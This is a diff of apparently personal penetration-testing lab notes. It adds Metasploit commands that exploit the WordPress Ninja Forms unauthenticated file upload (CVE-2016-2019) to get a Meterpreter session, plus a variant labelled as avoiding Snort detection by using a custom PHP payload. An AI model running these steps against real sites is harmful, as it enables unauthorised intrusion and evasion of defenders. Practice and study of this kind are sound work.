@@ -54,8 +54,24 @@ Discovered
 	5. set LHOST <LOCALHOST>
 	5. run
 	6. sysinfo
-Undiscovered:
-4. CVE-2016-2019 - 
+
+Creating undiscovered exploit:
+4. CVE-2016-2019 - Wordpress Ninja Forms Unauthenticated file upload
+	1. use exploit/unix/webapp/wp_ninja_forms_unauthenticated_file_upload
+	2. set RHOST <REMOTEHOST>
+	3. set RPORT 8585
+	4. set TARGETURI /wordpress/
+	5. set FORM_PATH /index.php/king-of-hearts/
+	_To alert snort_
+	6. set payload php/meterpreter/bind_tcp
+	7. set LHOST <LOCALHOST>
+	8. run
+	_To not alert snort_
+	6. set payload generic/custom
+	7. set payloadfile <PATHTOEXPLOIT> (e.g /root/cve_2016-2019_undetected.php)
+	8. run
+5. 
+
 Exploit failed: NoMethodError undefined method '[]' for nil:nilClass
 FIX:
 https://github.com/rapid7/metasploit-framework/commit/f838c9990fa3a7858297ada47288cc67f04d87e4
